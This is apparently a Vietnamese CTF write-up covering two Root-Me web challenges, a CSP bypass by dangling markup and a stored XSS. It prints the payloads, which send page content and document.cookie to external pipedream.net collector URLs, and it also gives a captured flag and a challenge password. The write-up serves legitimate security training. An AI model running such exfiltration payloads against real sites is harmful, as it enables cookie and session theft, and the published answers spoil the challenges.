## 23. CSP Bypass - Dangling markup 2
- Đây là một lỗi mà mình có thể thoát ra khỏi value và chèn đoạn HTML nguy hiểm.
- Ở đây có thể dùng \<table\> để tạo request.
- Tham khảo nội dung ở
https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection  
- Payload
```js
http://challenge01.root-me.org:58029/page?user="><table background='https://eoesrmo2qdh1ls6.m.pipedream.net?
```
```js
https://eoesrmo2qdh1ls6.m.pipedream.net/? !</h1>  <div class="message">        
<p>At Quackquack corp the developers think that they do not have to patch XSS because they implement the Content Security Policy (CSP). But you are a hacker, right ? I am sure you will be able to exfiltrate this flag: D4NGL1NG_M4RKUP_W1TH_CHR0ME_NO_N3W_LINE. (Only the bot is able to see the flagi :
```

## 27. XSS - Stored 2
- Bài này phát hiện được lỗi XSS ở status.
- Fetch thử ra bên ngoài thì thành công nhưng cần đổi status thành admin thì mới có cookie
- Payload:
```js
admin"><script>fetch("https://eoy0k4cp48905c8.m.pipedream.net?flag11=".concat(document.cookie))</script>
```
![Screenshot 2022-06-01 095501](https://i.imgur.com/uHhy10z.png)
- Click vô admin rồi đổi cookie là thành công
![Screenshot 2022-06-01 100014](https://i.imgur.com/lSrXBEx.png)
```js
Password: E5HKEGyCXQVsYaehaqeJs0AfV
```

